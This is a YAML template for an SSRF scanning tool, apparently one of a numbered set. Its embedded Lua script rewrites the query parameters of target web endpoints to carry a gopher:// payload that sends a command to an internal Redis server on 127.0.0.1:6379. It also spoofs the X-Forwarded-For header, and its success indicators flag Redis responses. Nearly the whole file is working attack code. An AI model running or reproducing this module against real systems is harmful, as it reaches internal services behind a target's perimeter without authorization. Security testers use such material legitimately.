# 28. gopher_redis.yaml
meta:
  id: gopher_redis
  version: 2
  name: "Gopher Protocol Redis"
  description: "Uses gopher:// to interact with Redis"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 70
  confidence: 70
  severity: high
  tags: [gopher, redis, internal]
  references: []
  success_indicator:
    - "regex:^\\$"
    - "regex:^\\*"
    - "literal:redis_version"
  failure_indicator:
    - "literal:<html"
    - "literal:<!DOCTYPE"
    - "literal:404"
    - "literal:Access Denied"
    - "literal:Forbidden"
    - "literal:Connection refused"

match:
  schemes: [http, https, gopher]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: run_batch
  source: |
    function run_batch(targets)
        local results = {}
        local payload_vector = "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a"
        local host_value = "127.0.0.1"
        for _, target in ipairs(targets) do
            local base_url = target.url
            for _, param in ipairs(target.params) do
                local new_url = base_url
                if param.location == "Query" then
                    local pattern = param.name .. "=[^&]*"
                    local replacement = param.name .. "=" .. payload_vector
                    if new_url:find(pattern) then
                        new_url = new_url:gsub(pattern, replacement)
                    else
                        local sep = new_url:find("%?") and "&" or "?"
                        new_url = new_url .. sep .. replacement
                    end
                end
                table.insert(results, {
                    url = new_url,
                    method = target.method or "GET",
                    headers = { ["X-Forwarded-For"] = host_value },
                })
            end
        end
        return results
    end
